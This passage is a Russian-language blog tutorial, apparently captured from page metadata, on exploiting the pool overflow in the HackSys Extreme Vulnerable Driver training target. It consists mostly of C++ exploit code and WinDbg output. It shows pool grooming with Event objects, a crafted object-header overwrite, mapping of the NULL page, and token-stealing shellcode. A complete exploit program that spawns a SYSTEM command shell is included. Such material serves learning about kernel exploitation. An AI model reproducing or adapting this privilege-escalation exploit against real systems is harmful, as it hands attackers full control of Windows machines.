(!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\n&quot;; ULONG payload_len = 0x1F8; LPVOID input_buff = VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(input_buff, &#39;\x41&#39;, payload_len); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\n&quot;; } return 0; } Вернёмся к чуть ранее показанному дампу kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even Наш аллокцированный чанк лежит ровно между объектами, которые мы сами создали Портим память Теперь, когда мы контролируем пул с достаточно предсказуемой манере, время перезаписать тут индекс и изменить его на 0x0 с 0xC. Всё остальное между нашей 0x200 аллокацией и этим байтом должно остаться таким же, иначе БСОД. Давайте просто воспользуемся командой dd, чтобы сдампить 32 значения DWORD из начала Event Objects сразу после нашего буфера ядра. kd&gt; dd 8513cac0 ReadVirtual: 8513cac0 not properly sign extended 8513cac0 04080040 ee657645 00000000 00000040 8513cad0 00000000 00000000 00000001 00000001 8513cae0 00000000 0008000c 86e7f640 00000000 8513caf0 ff040001 00000000 8513caf8 8513caf8 8513cb00 04080008 ee657645 00000000 00000040 8513cb10 00000000 00000000 00000001 00000001 8513cb20 00000000 0008000c 86e7f640 00000000 8513cb30 ff040001 00000000 8513cb38 8513cb38 Окей, нам нужно сохранить всё, как есть кроме 0xC и перезаписать этот байт нулём. Мы перезаписываем 40 байтов или 0x28, что даёт нам буфер размером 0x220 ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\x40\x00\x08\x04&quot; // pool header &quot;\x45\x76\x65\xee&quot; // pool tag &quot;\x00\x00\x00\x00&quot; // obj header quota begin &quot;\x40\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; // obj header quota end &quot;\x01\x00\x00\x00&quot; // obj header begin &quot;\x01\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x08\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\x42&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28) Нам нужно аллоцировать NULL страницу, что взято у tekwizzz123 typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); void allocate_shellcode() { _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\n&quot;; cout &lt;&lt; &quot;[&gt;] Putting &#39;AAAA&#39; on NULL page...\n&quot;; memset((void*)0x0, &#39;\x41&#39;, 0x100); } Также заполним NULL страницу \x42 значениями, чтобы, запустив этот код, мы получили Access Violation со значением 0x42424242 в eip И последнее, нам нужно освободить наши чанки, чтобы активировалась CloseProcedure void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\n&quot;; } Где-то здесь я пришёл к выводу, что его код всё-таки хороший и идея раскидать всё по функция стоит того)))) kd&gt; g Breakpoint 0 hit HEVD!TriggerPoolOverflow: a815b12a 6a14 push 14h kd&gt; g Breakpoint 1 hit HEVD!TriggerPoolOverflow+0xe6: a815b210 686cc315a8 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (a815c36c) kd&gt; g Access violation - code c0000005 (!!! second chance !!!) 41414141 ?? ??? Видим, что 0xC поменялся на 0x0 kd&gt; db 8756dd40-8 ReadVirtual: 8756dd38 not properly sign extended 8756dd38 42 42 42 42 42 42 42 42-40 00 08 04 45 76 65 ee BBBBBBBB@...Eve. 8756dd48 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd58 01 00 00 00 01 00 00 00-00 00 00 00 -&gt;00&lt;- 00 08 00 ................ 8756dd68 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... 8756dd78 78 dd 56 87 78 dd 56 87-08 00 08 04 45 76 65 ee x.V.x.V.....Eve. 8756dd88 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd98 01 00 00 00 01 00 00 00-00 00 00 00 0c 00 08 00 ................ 8756dda8 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... kd&gt; dd 0x00000000 00000000 41414141 41414141 41414141 41414141 00000010 41414141 41414141 41414141 41414141 Шеллкод kd&gt; k # ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 00 a9f93ae8 82886565 0x41414141 01 a9f93b38 828b54a7 nt!ObpCloseHandleTableEntry+0x6d 02 a9f93b68 8289d617 nt!ExSweepHandleTable+0x5f 03 a9f93b88 828aa467 nt!ObKillProcess+0x54 04 a9f93bfc 8289d0fa nt!PspExitThread+0x5e4 05 a9f93c24 82679e06 nt!NtTerminateProcess+0x12e &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 06 a9f93c24 77ab6c74 (T) nt!KiSystemServicePostCall &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 07 0030f9b0 7754be67 (T) 0x77ab6c74 08 0030f9c4 6e33603d 0x7754be67 09 0030fa18 6e3361b1 0x6e33603d 0a 0030fa24 00021a10 0x6e3361b1 0b 0030fa40 00021a57 0x21a10 0c 0030fa4c 00023007 0x21a57 0d 0030fa94 7753ef8c 0x23007 0e 0030faa0 77ad367a 0x7753ef8c 0f 0030fae0 77ad364d 0x77ad367a 10 0030faf8 00000000 0x77ad364d 8288650d 0fb64e0c movzx ecx,byte ptr [esi+0Ch] 82886511 8b1c8de02e7882 mov ebx,dword ptr nt!ObTypeIndexTable (82782ee0)[ecx*4] 82886518 57 push edi 82886519 648b3d24010000 mov edi,dword ptr fs:[124h] 82886520 837b7400 cmp dword ptr [ebx+74h],0 82886524 8d4e18 lea ecx,[esi+18h] 82886527 894c2414 mov dword ptr [esp+14h],ecx 8288652b c644241300 mov byte ptr [esp+13h],0 82886530 0f8497000000 je nt!ObpCloseHandleTableEntry+0xd5 (828865cd) 82886536 648b0d24010000 mov ecx,dword ptr fs:[124h] 8288653d 8b4510 mov eax,dword ptr [ebp+10h] 82886540 394150 cmp dword ptr [ecx+50h],eax 82886543 7410 je nt!ObpCloseHandleTableEntry+0x5d (82886555) 82886545 8d4c2420 lea ecx,[esp+20h] 82886549 51 push ecx 8288654a 50 push eax 8288654b e8c71ce5ff call nt!KeStackAttachProcess (826d8217) 82886550 c644241301 mov byte ptr [esp+13h],1 82886555 ff7518 push dword ptr [ebp+18h] 82886558 ff7514 push dword ptr [ebp+14h] 8288655b ff74241c push dword ptr [esp+1Ch] 8288655f ff7510 push dword ptr [ebp+10h] 82886562 ff5374 call dword ptr [ebx+74h] 82886565 84c0 test al,al 82886567 7561 jne nt!ObpCloseHandleTableEntry+0xd2 (828865ca) Видим пуши, которые нужно будет компенсировать попом в конце шеллкода kd&gt; dd 0x0 00000000 00000000 00000000 00000000 00000000 00000010 00000000 00000000 00000000 00000000 00000020 00000000 00000000 00000000 00000000 00000030 00000000 00000000 00000000 00000000 00000040 00000000 00000000 00000000 00000000 00000050 00000000 00000000 00000000 00000000 00000060 00060000 00000000 00000000 00000000 00000070 00000000 00000000 00000000 00000000 kd&gt; u 00060000 L15 00060000 60 pushad 00060001 64a124010000 mov eax,dword ptr fs:[00000124h] 00060007 8b4050 mov eax,dword ptr [eax+50h] 0006000a 89c1 mov ecx,eax 0006000c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] 00060012 ba04000000 mov edx,4 00060017 8b80b8000000 mov eax,dword ptr [eax+0B8h] 0006001d 2db8000000 sub eax,0B8h 00060022 3990b4000000 cmp dword ptr [eax+0B4h],edx 00060028 75ed jne 00060017 0006002a 8b90f8000000 mov edx,dword ptr [eax+0F8h] 00060030 8991f8000000 mov dword ptr [ecx+0F8h],edx 00060036 61 popad 00060037 c21000 ret 10h 0006003a 0000 add byte ptr [eax],al 0006003c 0000 add byte ptr [eax],al 0006003e 0000 add byte ptr [eax],al 00060040 0000 add byte ptr [eax],al 00060042 0000 add byte ptr [eax],al 00060044 0000 add byte ptr [eax],al 00060046 0000 add byte ptr [eax],al Полный код #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; HANDLE grab_handle() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\n&quot;; return hFile; } void spray_pool() { cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\n&quot;; } void allocate_shellcode() { _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\n&quot;; cout &lt;&lt; &quot;[&gt;] Placing pointer to shellcode on NULL page at offset 0x60...\n&quot;; BYTE shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC2\x10\x00&quot; // ret 0x10 ); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, shellcode, sizeof(shellcode)); memset((void*)0x0, &#39;\x00&#39;, 0x100); memcpy((void*)0x60, (void*)&amp;shellcode_addr, 0x4); } void send_payload(HANDLE hFile) { ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\x40\x00\x08\x04&quot; // pool header &quot;\x45\x76\x65\xee&quot; // pool tag &quot;\x00\x00\x00\x00&quot; // obj header quota begin &quot;\x40\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; // obj header quota end &quot;\x01\x00\x00\x00&quot; // obj header begin &quot;\x01\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x08\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\x41&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\n&quot;; } } void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\n&quot;; } void spawn_shell() { cout &lt;&lt; &quot;[&gt;] Spawning nt authority/system shell...\n&quot;; PROCESS_INFORMATION pi; ZeroMemory(&amp;pi, sizeof(pi)); STARTUPINFOA si; ZeroMemory(&amp;si, sizeof(si)); CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); } int main() { HANDLE hFile = grab_handle(); spray_pool(); allocate_shellcode(); send_payload(hFile); free_chunks(); spawn_shell(); return 0; }" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/13.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-10-11T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/13.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x03 Pool Overflow [ru]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-10-11T00:00:00+00:00","datePublished":"2022-10-11T00:00:00+00:00","description":"будет перевод вот этой статейки И ещё вот этой Pool Feng-Shui Перед тем как мы погрузимся в Pool Overflow, нам нужно понять базу пула, как его использовать для наших целей. Действительно хорошая статья по этому поводу есть у Tarjei Mandt. Настоятельно рекумендуется прочитать её перед тем, как идти дальше Ядерный пул очень похож на кучу Windows, так как он используется для хранения динамических аллокаций памяти. Как и Heap Spray для подготовки(?) к обычным приложениям, в пространстве ядра нам нужно найти способ подготовки(?) пула таким образом, чтобы мы могли предсказуемо вызвать наш шеллкод из памяти. Очень важно понимать концепцию аллокатора пула и как работает механизм аллокации и деаллокации пула. Для нашего HEVD драйвера уязвимый пользовательский буфер аллоциется в невыгружемом пуле, так что нам нужно найти технику для грума(?) невыгружаемого пула. Windows предоставляет объект события, который хранится в невыгружаемом пуле и может быть создан с помощью CreateEvent: HANDLE WINAPI CreateEvent( _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCTSTR lpName ); Здесь нам нужно создать два больших массива объектов события с помощью этого апи и затем создать дыры в этом аллоцированном чанке с помощью освобождения некоторых из объектов события в одном из массивов, используя CloseHandle, которые после объединения объединятся в большее большие свободные чанки: BOOL WINAPI CloseHandle( _In_ HANDLE hObject ); В эти свободные чанки нам нужно будет вставить наш уязвимый пользовательский буфер таким образом, чтобы он надежно перезаписывал нужную область памяти каждый раз, как мы будем “портить” соседний заголовок объекта события, чтобы перенаправить поток выполнения на наш шеллкод. После этого мы положим указатель на наш шеллкод таким образом, чтобы он мог быть вызван с помощью манипуляций нашим покоррапченным заголовком. Мы будем фейкать заголовок OBJECT_TYPE, переписывая указатель на одну из процедур в OBJECT_TYPE_INITIALIZER В сорцах видим то же: нет проверким на длину переданного буфера. __try { DbgPrint(&quot;[+] Allocating Pool chunk\\n&quot;); // Allocate Pool chunk KernelBuffer = ExAllocatePoolWithTag(NonPagedPool, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)POOL_TAG); if (!KernelBuffer) { // Unable to allocate Pool chunk DbgPrint(&quot;[-] Unable to allocate Pool chunk\\n&quot;); Status = STATUS_NO_MEMORY; return Status; } else { DbgPrint(&quot;[+] Pool Tag: %s\\n&quot;, STRINGIFY(POOL_TAG)); DbgPrint(&quot;[+] Pool Type: %s\\n&quot;, STRINGIFY(NonPagedPool)); DbgPrint(&quot;[+] Pool Size: 0x%X\\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); DbgPrint(&quot;[+] Pool Chunk: 0x%p\\n&quot;, KernelBuffer); } // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR)); DbgPrint(&quot;[+] UserBuffer: 0x%p\\n&quot;, UserBuffer); DbgPrint(&quot;[+] UserBuffer Size: 0x%X\\n&quot;, Size); DbgPrint(&quot;[+] KernelBuffer: 0x%p\\n&quot;, KernelBuffer); DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); #ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy(). // Hence, there will be no overflow RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE); #else DbgPrint(&quot;[+] Triggering Pool Overflow\\n&quot;); // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability // because the developer is passing the user supplied value directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of the allocated Pool chunk RtlCopyMemory(KernelBuffer, UserBuffer, Size); Снова пишем сплойт, ставим бряку и смотрим: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200f const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); const char* poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } in windbg: ed nt!Kd_Default_Mask 8 .sympath+ location_of_HEVD_pdb .reload .reload /f bp HEVD!TriggerPoolOverflow bp HEVD!TriggerPoolOverflow+e6 kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8509E008 [+] UserBuffer: 0x012721B0 [+] UserBuffer Size: 0x64 [+] KernelBuffer: 0x8509E008 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow [+] Freeing Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Chunk: 0x8509E008 ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ****** Попробуем длину ровно 0x1F8, будем на границе допустимого: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x850C4D50 [+] UserBuffer: 0x00375668 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x850C4D50 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Free ) Vad 850c4048 size: 48 previous size: 48 (Free ) Vad 850c4090 size: 48 previous size: 48 (Free ) Vad 850c40d8 size: 48 previous size: 48 (Free ) Vad 850c4120 size: 48 previous size: 48 (Free ) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 size: b8 previous size: 200 (Allocated) File (Protected) kd&gt; dd 850c4d48 L90 850c4d48 04400004 6b636148 00000000 0030e810 850c4d58 41414141 41414141 41414141 41414141 850c4d68 41414141 41414141 41414141 41414141 850c4d78 41414141 41414141 41414141 41414141 850c4d88 41414141 41414141 41414141 41414141 850c4d98 41414141 41414141 41414141 41414141 850c4da8 41414141 41414141 41414141 41414141 850c4db8 41414141 41414141 41414141 41414141 850c4dc8 41414141 41414141 41414141 41414141 850c4dd8 41414141 41414141 41414141 41414141 850c4de8 41414141 41414141 41414141 41414141 850c4df8 41414141 41414141 41414141 41414141 850c4e08 41414141 41414141 41414141 41414141 850c4e18 41414141 41414141 41414141 41414141 850c4e28 41414141 41414141 41414141 41414141 850c4e38 41414141 41414141 41414141 41414141 850c4e48 41414141 41414141 41414141 41414141 850c4e58 41414141 41414141 41414141 41414141 850c4e68 41414141 41414141 41414141 41414141 850c4e78 41414141 41414141 41414141 41414141 850c4e88 41414141 41414141 41414141 41414141 850c4e98 41414141 41414141 41414141 41414141 850c4ea8 41414141 41414141 41414141 41414141 850c4eb8 41414141 41414141 41414141 41414141 850c4ec8 41414141 41414141 41414141 41414141 850c4ed8 41414141 41414141 41414141 41414141 850c4ee8 41414141 41414141 41414141 41414141 850c4ef8 41414141 41414141 41414141 41414141 850c4f08 41414141 41414141 41414141 41414141 850c4f18 41414141 41414141 41414141 41414141 850c4f28 41414141 41414141 41414141 41414141 850c4f38 41414141 41414141 41414141 41414141 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 kd&gt; dd 850c4f48 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 Видим, что влезли идеально ... const char* poc = std::string(0x1f8, &#39;A&#39;).c_str(); ... DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 0x1f8, NULL, 0, &amp;bytesRetn, NULL); ... Впереди нашего чанка хедер следующего, если мы его покорраптим, улетим в BSOD kd&gt; dd 850c4f48-8 850c4f40 41414141 41414141 04170040 e56c6946 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 Поменяем длину на 0x200 и посмотрим, что будет: kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Allocated) Vad 850c4048 size: 48 previous size: 48 (Allocated) Vad 850c4090 size: 48 previous size: 48 (Allocated) 